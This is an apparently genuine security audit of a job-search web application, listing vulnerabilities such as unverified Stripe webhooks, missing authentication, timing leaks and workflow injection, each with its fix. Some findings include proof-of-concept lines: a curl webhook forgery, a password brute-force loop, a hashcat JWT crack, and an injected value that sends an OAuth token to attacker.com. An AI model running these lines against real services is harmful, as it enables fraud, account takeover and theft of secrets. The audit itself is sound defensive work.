# Security Audit — Jobseek

**Date:** 2026-03-31
**Scope:** `apps/web/` (Next.js 15, API routes), `apps/crawler/` (Python), `.github/workflows/`
**Branch:** `security`

---

## Summary

Eighteen vulnerabilities were identified and fixed across four audit passes. Two are
critical (unauthenticated subscription-granting and unauthenticated actor
triggering), three are high severity (free access to paid features and business
intelligence), and thirteen are medium severity (SSRF surface, timing side-channels,
missing brute-force protection, a Stripe replay-attack window, missing security
headers, auth token credential exposure, cookie misconfiguration, a workflow
injection hardening gap, JWT secret strength, password comparison truncation,
and missing email-change confirmation).

### Audit Pass 1 (2026-03-31)

| # | Severity | File | Status |
|---|----------|------|--------|
| 1 | CRITICAL | `app/api/stripe/webhook/route.ts` | Fixed |
| 2 | CRITICAL | `app/agentic/api/apify/run/route.ts` | Fixed |
| 3 | HIGH | `app/agentic/api/signals/route.ts` | Fixed |
| 4 | HIGH | `app/agentic/api/ghosting/route.ts` | Fixed |
| 5 | HIGH | `app/agentic/api/ghosting/[runId]/route.ts` | Fixed |
| 6 | HIGH | `app/agentic/api/ghosting/batch/route.ts` | Fixed |
| 7 | MEDIUM | `app/agentic/api/apify/status/[runId]/route.ts` | Fixed |
| 8 | MEDIUM | `app/agentic/api/hiring-cafe/route.ts` | Fixed |
| 9 | MEDIUM | `src/lib/agentic/agentAuth.ts` (`verifyAgentKey`) | Fixed |

### Audit Pass 2 (2026-03-31)

| # | Severity | File | Status |
|---|----------|------|--------|
| 10 | MEDIUM | `src/lib/admin/basic-auth.ts` (`matchesBasicAuthorization`) | Fixed |
| 11 | MEDIUM | `app/agentic/api/auth/login/route.ts` | Fixed |
| 12 | MEDIUM | `app/api/stripe/webhook/route.ts` (replay attack) | Fixed |

### Audit Pass 4 (2026-03-31)

| # | Severity | File | Status |
|---|----------|------|--------|
| 17 | MEDIUM | `src/lib/agentic/auth.ts` (`ADMIN_JWT_SECRET` minimum length not enforced) | Fixed |
| 18 | MEDIUM | `src/lib/agentic/auth.ts` (`checkPassword` truncates passwords > 64 bytes) | Fixed |
| 19 | MEDIUM | `src/lib/auth.ts` + `src/lib/email.ts` (`changeEmail` no old-address confirmation) | Fixed |

### Audit Pass 3 (2026-03-31)

| # | Severity | File | Status |
|---|----------|------|--------|
| 13 | MEDIUM | `apps/web/next.config.ts` (missing security headers: CSP, X-Frame-Options, X-Content-Type-Options) | Fixed |
| 14 | MEDIUM | `app/agentic/api/auth/login/route.ts` (SameSite=Lax on admin session cookie) | Fixed |
| 15 | MEDIUM | `apps/crawler/src/shared/api_sniff.py` (`clean_headers` leaks auth tokens to DB) | Fixed |
| 16 | LOW | `.github/workflows/resolve-company-requests.yml` (workflow injection hardening) | Fixed |

---

## Findings

### 1. CRITICAL — Stripe Webhook Signature Verification Commented Out

**File:** `app/api/stripe/webhook/route.ts`

**Description:**
The Stripe HMAC-SHA256 signature check was entirely commented out. The endpoint
parsed the raw request body as JSON and immediately processed any event payload,
including `checkout.session.completed`. This allowed anyone who could POST a
crafted JSON body to promote any user account to an unlimited-plan active
subscription at zero cost.

**Proof of concept:**
```bash
curl -X POST https://jseek.co/api/stripe/webhook \
  -H 'Content-Type: application/json' \
  -d '{"type":"checkout.session.completed","data":{"object":{"metadata":{"userId":"<victim-id>"},"customer":"cus_fake","subscription":"sub_fake"}}}'
```

**Fix:**
Implemented HMAC-SHA256 signature verification using the Web Crypto API and
`crypto.timingSafeEqual`. The endpoint now reads the raw request body as text,
extracts the `stripe-signature` header, recomputes the HMAC over
`<timestamp>.<body>`, and rejects any request where the computed digest does not
match a `v1=` value in the header. If `STRIPE_WEBHOOK_SECRET` is not set the
endpoint returns 503 rather than falling back to unverified processing.

---

### 2. CRITICAL — Unauthenticated Apify Orchestrator Trigger

**File:** `app/agentic/api/apify/run/route.ts`

**Description:**
`POST /agentic/api/apify/run` triggered an Apify actor run with zero
authentication. Apify actor runs consume API credits proportional to compute
time (CPU, memory, network). Any internet user could trigger unbounded runs
against the project's Apify account, exhausting credits and incurring billing
charges.

**Fix:**
Added `verifyGhostingAdminKey` guard (timing-safe check against
`GHOSTING_ADMIN_SECRET`). Callers must supply
`Authorization: Auth Bearer Basic <secret>`.

---

### 3. HIGH — Unauthenticated Hiring-Signal Business Intelligence Exposure

**File:** `app/agentic/api/signals/route.ts`

**Description:**
`GET /agentic/api/signals` returned up to 200 rows from the `hiringSignal` table
with no authentication. The table contains proprietary analysis: signal type,
score, AI reasoning, and metadata per company — the core paid-tier deliverable.
This data was freely readable by any unauthenticated request.

**Fix:**
Added `verifyGhostingAdminKey` guard. The endpoint now requires
`Authorization: Auth Bearer Basic <GHOSTING_ADMIN_SECRET>`.

---

### 4. HIGH — Unauthenticated Ghost-Job Analysis Trigger

**File:** `app/agentic/api/ghosting/route.ts`

**Description:**
`POST /agentic/api/ghosting` triggered an Apify wayback-job-history actor run
with no authentication. The paid endpoint at `/ghosting/paid` enforced the
paywall, but the base route had none, making the paywall trivially bypassable by
any client that simply called the base URL.

**Fix:**
Added `checkPaywall` guard (identical to `/ghosting/paid`). Both the free-tier
and paid-tier paths now require a valid Bearer token.

---

### 5. HIGH — Unauthenticated Ghost-Job Result Polling

**File:** `app/agentic/api/ghosting/[runId]/route.ts`

**Description:**
`GET /agentic/api/ghosting/:runId` returned the full ghost-job analysis
(ghost rate, AI summary, per-role scores) for any run ID, with no
authentication. An attacker who triggered a run via any path — or guessed/
enumerated a run ID from the Apify orchestrator — could retrieve the paid-tier
analysis for free.

**Fix:**
Added `checkPaywall` guard. Callers must present a valid Bearer token before
run results are returned.

---

### 6. HIGH — Unauthenticated Ghost-Job Batch Trigger

**File:** `app/agentic/api/ghosting/batch/route.ts`

**Description:**
`POST /agentic/api/ghosting/batch` accepted 1–10 company entries and launched a
separate Apify actor run per entry, with no authentication. This is a force
multiplier: a single request could spawn 10 parallel actor runs, each consuming
Apify credits for the duration of the analysis (typically 5–30 minutes each).

**Fix:**
Added `verifyGhostingAdminKey` guard (admin-only, matching
`/ghosting/admin`).

---

### 7. MEDIUM — Unauthenticated Apify Run-Status Enumeration

**File:** `app/agentic/api/apify/status/[runId]/route.ts`

**Description:**
`GET /agentic/api/apify/status/:runId` proxied Apify run-status API calls with
no authentication. Any caller who knew (or guessed) a run ID could learn run
metadata and, depending on the Apify actor, retrieve dataset contents.

**Fix:**
Added `checkPaywall` guard. Run-status queries now require a valid Bearer token.

---

### 8. MEDIUM — Unauthenticated External API Proxy (SSRF / Resource Abuse)

**File:** `app/agentic/api/hiring-cafe/route.ts`

**Description:**
`POST /agentic/api/hiring-cafe` proxied requests to `hiring.cafe` and
`web.archive.org` with no authentication. The route is a server-side proxy:
it makes outbound HTTP calls on behalf of the caller. Without authentication
any internet user could:

- Enumerate company data from `hiring.cafe` at scale via the server's IP,
  avoiding client-side rate-limiting.
- Cause the server to make a large number of Wayback Machine CDX requests,
  potentially triggering IP-level blocks for the entire application.

**Fix:**
Added `checkPaywall` guard.

---

### 9. MEDIUM — Timing Side-Channel in `verifyAgentKey`

**File:** `src/lib/agentic/agentAuth.ts`

**Description:**
The `verifyAgentKey` function compared the provided token to `AGENT_API_KEY`
using the JavaScript `===` operator. String equality in V8 short-circuits on
the first differing byte, leaking the secret length and a timing signal that
can be exploited by a sufficiently patient attacker to enumerate the key
character-by-character via a remote timing oracle.

**Fix:**
Replaced `===` with `crypto.timingSafeEqual` (using the same padding strategy
already present in `verifyGhostingAdminKey`). Both branches of agentAuth now
use constant-time comparison.

---

---

## Audit Pass 2 Findings

### 10. MEDIUM — Timing Side-Channel in `matchesBasicAuthorization`

**File:** `src/lib/admin/basic-auth.ts`

**Description:**
The `matchesBasicAuthorization` function compared the provided `Basic` token to
`ADMIN_SECRET` using the JavaScript `===` operator. String equality in V8
short-circuits on the first differing byte, leaking a timing signal that a
patient attacker could use to enumerate the secret character-by-character via a
remote timing oracle. The affected route is `POST /api/admin/meta/apify-import`
which triggers a Meta Careers Apify data import. This was the same class of
vulnerability fixed in `verifyAgentKey` in Pass 1 (finding #9).

**Proof of concept:**
Repeated requests with incrementally longer matching prefixes produce measurable
timing differences under a noise-averaging attack. With sufficient request volume
(typically thousands), the full secret can be extracted.

**Fix:**
Replaced `===` with `crypto.timingSafeEqual`, using the same padding strategy
(`padEnd(128)`) already used in `verifyGhostingAdminKey` and `verifyAgentKey`.
Added an explicit `scheme !== "Basic"` early-exit before the secret comparison.

---

### 11. MEDIUM — No Rate Limiting on Agentic Admin Login

**File:** `app/agentic/api/auth/login/route.ts`

**Description:**
`POST /agentic/api/auth/login` accepted unlimited password guesses with no
brute-force protection. An attacker could mount a high-throughput dictionary
or brute-force attack against `ADMIN_PASSWORD` without any throttling. A
successful guess yields a 7-day JWT session cookie granting access to all
agentic admin views. The main auth route at `/api/auth/[...all]` already had
rate limiting (10 req/60 s), but the agentic login had none.

**Attack scenario:**
```bash
# Enumerate common passwords or short secrets at full network speed
for pass in $(cat rockyou.txt); do
  curl -s -X POST https://jseek.co/agentic/api/auth/login \
    -H 'Content-Type: application/json' \
    -d "{\"password\":\"$pass\"}" | grep -q '"ok":true' && echo "FOUND: $pass" && break
done
```

**Fix:**
Added `agenticLoginLimiter` (5 requests per 15 minutes per IP, using Upstash
Redis sliding window) in `src/lib/rate-limit.ts` and applied it as the first
check in the login handler. Returns `429 Too Many Requests` with `Retry-After`
when the limit is exceeded. Falls through if Redis is unavailable to avoid a
denial-of-service on the login if Redis goes down.

---

### 12. MEDIUM — Stripe Webhook Missing Replay-Attack Protection

**File:** `app/api/stripe/webhook/route.ts`

**Description:**
The Stripe webhook signature verification (added in Pass 1) verifies the
HMAC-SHA256 signature correctly, but did not check the `t=` timestamp embedded
in the `stripe-signature` header. Stripe includes this timestamp to enable
replay-attack protection: a valid signed event from the past can be replayed
indefinitely because the server never checked whether the timestamp was recent.

**Attack scenario:**
An attacker who can observe a legitimate `checkout.session.completed` event
(e.g., via network interception, a compromised logging pipeline, or an
accidentally-logged header dump) could replay that event at any future time to
re-activate a subscription without paying again:

```bash
# Replayed captured webhook (valid signature, stale timestamp)
curl -X POST https://jseek.co/api/stripe/webhook \
  -H 'stripe-signature: t=1700000000,v1=<captured-valid-signature>' \
  -d '<captured-body>'
```

**Fix:**
Added a `±300 second` (5-minute) tolerance check in `verifyStripeSignature`.
The function now parses `t=<unix-seconds>` from the signature header, compares
it against `Date.now()`, and returns `false` if the absolute difference exceeds
300 seconds. This matches the protection provided by `stripe.webhooks.constructEvent()`
in the official Stripe SDK.

---

## Routes Audited — No Issues Found

The following routes were reviewed and found to have appropriate access controls
already in place:

| Route | Auth mechanism |
|-------|---------------|
| `POST /agentic/api/ghosting/admin` | `verifyGhostingAdminKey` |
| `GET /agentic/api/ghosting/admin/:runId` | `verifyGhostingAdminKey` |
| `POST /agentic/api/discovery/trigger` | `verifyGhostingAdminKey` |
| `GET /agentic/api/discovery` | `verifyGhostingAdminKey` |
| `GET /agentic/api/companies` | `checkPaywall` |
| `GET /agentic/api/jobs` | `checkPaywall` |
| `GET /agentic/api/jobs/:id` | `checkPaywall` |
| `GET /agentic/api/me` | `checkPaywall` |
| `GET /agentic/api/ping` | `checkPaywall` |
| `POST /agentic/api/ghosting/paid` | `checkPaywall` |
| `GET /agentic/api/ghosting/paid/:runId` | `checkPaywall` |
| `POST /api/admin/meta/apify-import` | HTTP Basic (`matchesBasicAuthorization`) — now timing-safe |
| `POST /agentic/api/auth/login` | Password check + rate limit |
| `POST /agentic/api/auth/logout` | N/A (clears cookie) |
| `GET /api/v1/*` | Rate-limited, public read API — appropriate |
| `GET/POST/DELETE /mcp` | Public MCP endpoint — only proxies to public/paywalled APIs; no auth bypass possible |

---

## Recommendations

1. **Enable Stripe SDK verification** — Once the `stripe` package is installed,
   replace the hand-rolled HMAC check with `stripe.webhooks.constructEvent()`
   which also validates the timestamp to prevent replay attacks within a 5-minute
   window. Remove the `STRIPE_WEBHOOK_SECRET` guard for the case where the env var
   is unset — production should fail hard.

2. **Rotate secrets** — `GHOSTING_ADMIN_SECRET`, `AGENT_API_KEY`, and
   `ADMIN_SECRET` should be rotated now that unauthenticated or timing-observable
   access existed in production. Any secret transmitted over the wire before
   these fixes should be considered potentially compromised.

3. **Add rate-limiting to agentic endpoints** — Even with auth in place, the
   ghosting and apify endpoints trigger expensive third-party operations. Consider
   adding per-user rate limits (e.g., max 5 actor runs / hour) to limit damage
   from a compromised credential.

4. **Review Apify dataset visibility** — Apify datasets created by the actor runs
   may be publicly readable via the Apify platform if the actor was not configured
   with `DATASET_IS_PUBLIC: false`. Audit Apify actor settings.

---

## Audit Pass 3 Findings

### 13. MEDIUM — Missing Security Headers (CSP, X-Frame-Options, X-Content-Type-Options)

**File:** `apps/web/next.config.ts`

**Description:**
The Next.js application served no `Content-Security-Policy`, `X-Frame-Options`,
`X-Content-Type-Options`, `Referrer-Policy`, or `Permissions-Policy` headers on
any route. The absence of these headers enables several classes of attack:

- **Clickjacking**: Without `X-Frame-Options` or `frame-ancestors`, any third-party
  site can embed the application in an invisible iframe and trick authenticated users
  into performing unintended actions (e.g., changing account settings, making
  purchases).
- **XSS escalation**: Without a `Content-Security-Policy`, any Cross-Site Scripting
  vulnerability (including those from third-party libraries) can execute arbitrary
  JavaScript with no browser-enforced sandbox. With CSP, an XSS payload that cannot
  load external scripts or exfiltrate data via `connect-src` is substantially
  constrained.
- **MIME sniffing**: Without `X-Content-Type-Options: nosniff`, browsers may
  interpret responses with ambiguous `Content-Type` headers (e.g., user-uploaded
  content) as executable HTML or JavaScript.
- **Information leakage**: Without `Referrer-Policy`, the full URL (including
  path and query string) is sent as the `Referer` header to every third-party
  resource, leaking authenticated session paths to external servers.

**Fix:**
Added a global `/:path*` header rule in `next.config.ts` that sets:
- `X-Frame-Options: SAMEORIGIN`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy: camera=(), microphone=(), geolocation=()`
- `Content-Security-Policy` with `default-src 'self'`, `script-src 'self' 'unsafe-inline'`
  (Next.js requires `unsafe-inline` for its runtime bootstrap), `img-src` allowing
  the trusted R2 CDN domain, and `frame-ancestors 'self'`.

**Note:** `'unsafe-inline'` for scripts is required by the current Next.js
runtime. The next hardening step would be to move to nonce-based CSP using
Next.js middleware, which eliminates the need for `'unsafe-inline'` entirely.

---

### 14. MEDIUM — Admin Session Cookie `SameSite=Lax` Instead of `Strict`

**File:** `app/agentic/api/auth/login/route.ts`

**Description:**
The `admin_session` JWT cookie was set with `SameSite=Lax`. The `Lax` policy
allows the cookie to be sent with top-level `GET` navigations from third-party
sites (e.g., links in emails, social media). An attacker could construct a URL
to a GET-based admin endpoint and embed it as an image `src` or redirect target
on an attacker-controlled page. When a logged-in admin visits the attacker's
page, their browser automatically includes the `admin_session` cookie in the
request (CSRF via cross-site GET).

While the agentic admin panel currently requires `POST` for all state-changing
actions, `Lax` leaves a residual CSRF surface for any current or future `GET`
endpoint that has side effects. Using `Strict` eliminates this entirely: the
cookie is only sent when the navigation originated from the same site.

**Attack scenario:**
```html
<!-- Attacker's page -->
<img src="https://jseek.co/agentic/some-admin-get-endpoint" />
<!-- Admin's browser sends admin_session cookie — Lax allows this -->
```

**Fix:**
Changed `sameSite: "lax"` to `sameSite: "strict"` on the `admin_session` cookie.
The agentic admin panel is always accessed directly (not via cross-site links),
so `Strict` has no usability impact.

---

### 15. MEDIUM — Captured Auth Tokens Persisted in Board Config (Credential Exposure)

**File:** `apps/crawler/src/shared/api_sniff.py` (`clean_headers` / `_SKIP_HEADERS`)

**Description:**
The `clean_headers()` function strips headers that should not be forwarded in
replayed API requests or stored in the board metadata database. However,
`_SKIP_HEADERS` only excluded connection-level headers (`host`, `connection`,
`content-length`, `accept-encoding`, `transfer-encoding`). Auth-bearing headers
— `Authorization`, `Cookie`, `X-API-Key`, `X-Auth-Token` — were **not** excluded.

During Playwright-based API sniffing (`api_sniffer.py`), all XHR/fetch requests
are captured including their request headers. When the sniffer finds a high-scoring
API endpoint, it stores the cleaned headers in `meta["request_headers"]` as part
of the board config (written to the `job_board.metadata` column in PostgreSQL and
exported to Supabase). This means short-lived session cookies and API keys for
third-party career platforms could be:

1. **Persisted to the database** — visible to anyone with DB read access.
2. **Exported to Supabase** — visible to anyone with Supabase table access.
3. **Used in subsequent replay requests** — the sniffer replays stored headers
   for board monitoring; a leaked `Authorization` header in config would be
   replayed repeatedly until the token expires.

**Attack scenario:**
A company career page that requires a session-based auth token (e.g., an internal
ATS using company SSO) would have the session token captured during Playwright
sniffing, stored in the board metadata, and replayed on every subsequent crawl.
If the DB metadata were logged or exposed, this constitutes a credential breach.

**Fix:**
Extended `_SKIP_HEADERS` to include: `authorization`, `cookie`, `set-cookie`,
`x-api-key`, `x-auth-token`, `x-access-token`, `x-csrf-token`, `x-session-token`,
`proxy-authorization`. These headers are now stripped before headers are stored
in board config or used in replayed requests.

---

### 16. LOW — Workflow Injection Hardening Gap

**File:** `.github/workflows/resolve-company-requests.yml`

**Description:**
The `Resolve issue` step interpolated `${{ steps.select.outputs.selected }}` —
the GitHub Actions step output containing the selected issue number — directly
into a shell `run:` script string. Although `select-issue.sh` only ever writes
a bare integer to `GITHUB_OUTPUT`, direct `${{ ... }}` interpolation inside a
`run:` step is a recognized anti-pattern (documented by GitHub Security Lab).
Any future change to `select-issue.sh` that outputs non-numeric content (e.g.,
a branch name containing shell metacharacters) would immediately become a shell
injection vulnerability, allowing arbitrary command execution in the workflow
runner with access to all repository secrets.

**Attack scenario:**
If `select-issue.sh` were modified to output, or if a future code path produced
a value like `1; curl https://attacker.com/exfil -d "$CLAUDE_CODE_OAUTH_TOKEN"`,
that string would execute verbatim in the shell. The workflow runs with access to
`CLAUDE_CODE_OAUTH_TOKEN` and `GH_TOKEN`, making this a high-value target.

**Fix:**
Moved the interpolated value to an environment variable (`ISSUE_NUMBER`) and
added an integer validation guard (`[[ "$ISSUE_NUMBER" =~ ^[0-9]+$ ]]`) before
it is used in the shell script. The shell now references `${ISSUE_NUMBER}` rather
than the raw `${{ ... }}` expression, following GitHub's recommended pattern for
preventing script injection.

---

---

## Audit Pass 4 Findings

### 17. MEDIUM — `ADMIN_JWT_SECRET` Minimum Length Not Enforced

**File:** `src/lib/agentic/auth.ts` (`getSecret`)

**Description:**
`getSecret()` threw an error when `ADMIN_JWT_SECRET` was unset but accepted
any non-empty string, including a single character. HS256 requires a key of
at least 256 bits (32 bytes) per NIST SP 800-131A. A secret shorter than
32 characters is trivially brutable offline: if an attacker captures any
`admin_session` JWT (e.g., from a log, an error response, or a network
intercept), they can enumerate all short secrets in seconds on commodity
hardware to recover the signing key and forge arbitrary tokens.

**Attack scenario:**
```bash
# With a 1-char secret "x", an attacker captures the cookie value and brutes:
hashcat -m 16500 captured.jwt -a 3 -w 3 ?a  # done in milliseconds
# Forged token grants unlimited admin access to agentic panel
```

**Fix:**
Added a minimum-length check: `getSecret()` now throws at startup if
`ADMIN_JWT_SECRET` is fewer than 32 characters, ensuring the HS256 key
meets the 256-bit security margin.

---

### 18. MEDIUM — `checkPassword` Truncates Passwords Longer Than 64 Bytes

**File:** `src/lib/agentic/auth.ts` (`checkPassword`)

**Description:**
The previous implementation used `Buffer.from(submitted.padEnd(64))` and
then compared only `subarray(0, 64)`. For passwords longer than 64 bytes
`padEnd` is a no-op and `subarray` silently truncates to the first 64 bytes.
The `submitted.length === expected.length` guard does prevent comparing
strings of different lengths, but two passwords that share the same length
and the same first 64 bytes are indistinguishable. An attacker who knows
the first 64 bytes of an `ADMIN_PASSWORD` longer than 64 chars only needs to
match those 64 bytes — any trailing characters are ignored.

**Proof of concept (local):**
```js
// Both return true (before fix):
checkPassword("a".repeat(65) + "X");  // actual password: "a".repeat(65) + "Y"
```

**Fix:**
Replaced `padEnd(64)` + `subarray(0, 64)` with `Buffer.alloc(256)` +
`Buffer.copy()`. The 256-byte fixed buffer is far above any realistic
password length, so no content is ever truncated. The full UTF-8 encoding
of both passwords is written into their respective zero-padded buffers and
`timingSafeEqual` compares all 256 bytes.

---

### 19. MEDIUM — Email Change Requires No Confirmation from Old Address

**File:** `src/lib/auth.ts`, `src/lib/email.ts`

**Description:**
Better Auth's `changeEmail` was enabled without configuring
`sendChangeEmailConfirmation`. Under this configuration Better Auth sends a
verification link to the **new** email only. The old email address receives
no notification and no confirmation is required from it. An attacker who
hijacks an active session (via XSS, session token theft, or a compromised
device) can silently reassign the account to an attacker-controlled address.
Once the new email is verified, the original owner loses all recovery paths
(password reset emails go to the attacker's inbox; the old address is no
longer associated with the account).

**Attack scenario:**
1. Attacker steals a valid `better-auth.session_token` cookie.
2. Attacker calls `POST /api/auth/change-email` with `{ newEmail: "attacker@evil.com" }`.
3. Attacker verifies the link sent to their inbox.
4. Account is now fully under attacker control — the victim gets no email,
   password-reset tokens go to the attacker.

**Fix:**
Added `sendChangeEmailConfirmation` to the `changeEmail` config in
`auth.ts`. Better Auth will now email a confirmation link to the **old**
address before the change is applied. The link must be clicked within the
configured expiry window; if it is not, the email remains unchanged.

A new `sendChangeEmailConfirmationEmail` helper was added to `email.ts`
with full i18n copy for all four supported locales (en/de/fr/it) and
proper HTML escaping of the new email address in the email body.

---

## Pass 4 — Areas Reviewed with No Issues Found

| Area | Finding |
|------|---------|
| JWT algorithm confusion (`jwtVerify` in jose) | `jwtVerify(token, Uint8Array)` only accepts symmetric (HMAC) algorithms. `alg: none` and RS256/HS256 switching are both rejected. |
| Session fixation on login | Better Auth issues a fresh session token on every successful sign-in; no pre-existing token is re-used. |
| OAuth callback validation | Better Auth validates the `state` parameter and restricts redirect targets to `trustedOrigins`. |
| `eval()` / `exec()` in Python crawler | No occurrences found in `apps/crawler/src/`. |
| Pickle deserialization | No `pickle.load` or `pickle.loads` calls found anywhere in the crawler. |
| Shell injection in `subprocess` calls | All `subprocess.run` / `Popen` calls use list-form arguments (never `shell=True`). No user-controlled values are interpolated. |
| Unsafe YAML loading | All YAML reads use `yaml.safe_load`; no `yaml.load(stream)` without a Loader found. |
| Path traversal in file-serving routes | No `fs.readFile` or `createReadStream` calls accept user-supplied paths in any route handler. |
| Prototype pollution | No `Object.assign(..., userBody)` or spread of unsanitised request bodies into sensitive objects. |
| ReDoS via user-supplied keywords | Keywords are used in PostgreSQL `~*` regex; all regex metacharacters are escaped before use (`/[.*+?^${}()|[\]\\]/g`). No backtracking-heavy patterns. |
| `pnpm audit` (HIGH+CRITICAL) | No known HIGH or CRITICAL CVEs. |
| Python dependency vulnerabilities | `pip-audit` not installed; `cryptography` is at 46.0.6 (current). PyYAML, Pillow, httpx at current versions. No known critical CVEs in pinned versions. |

---

## Pass 3 — Areas Reviewed with No Issues Found

| Area | Finding |
|------|---------|
| SQL injection in asyncpg queries (`queries/monitor.py`, `queries/scrape.py`, `queries/lookups.py`) | All queries use `$N` positional parameters. No f-string interpolation of user data into SQL. |
| SQL injection in `bootstrap.py` and `exporter.py` f-string SQL | Column names in f-strings are hardcoded Python lists (`_BOARD_COLUMNS`, `_POSTING_COLUMNS`), not user-controlled. |
| SSRF via `board_url` redirect following | `board_url` values are admin-configured (from `boards.csv`), not user-supplied. No untrusted-user SSRF surface. |
| Redis key injection | `board_id` and `posting_id` are PostgreSQL UUID primary keys; `domain` comes from `urlparse().hostname`. No user-controlled key prefix injection possible. |
| R2 upload path traversal | `posting_id` is a UUID from DB; `locale` comes from parsed API response but R2/S3 does not treat `..` as filesystem traversal — object keys are opaque strings. Low residual risk. |
| Next.js server actions auth | All mutation actions (`toggleSavedJob`, `toggleStarredCompany`, `updatePreferences`, etc.) gate on `getSessionUserId()` which returns `null` for unauthenticated callers; callers return early with error/empty results. |
| Next.js middleware coverage | Middleware only handles locale redirection; no auth enforcement at middleware level. Auth is enforced at the action/route level individually. Appropriate for this architecture. |
| `NEXT_PUBLIC_` env var exposure | Only `NEXT_PUBLIC_SITE_URL` and `NEXT_PUBLIC_PORTAL_URL` are exposed — both are public site URLs with no secrets. |
| GitHub Actions third-party action pinning | All actions pinned to full commit SHAs with version comment. |
| GitHub Actions secrets in logs | Secrets are only passed via `env:` blocks, never directly interpolated into `run:` echo statements. |
| `label-rejected-requests.yml` injection | The workflow fetches the comment body via the GitHub API (`gh api`) into a local variable rather than interpolating `${{ github.event.comment.body }}` into the shell — correctly defended. |
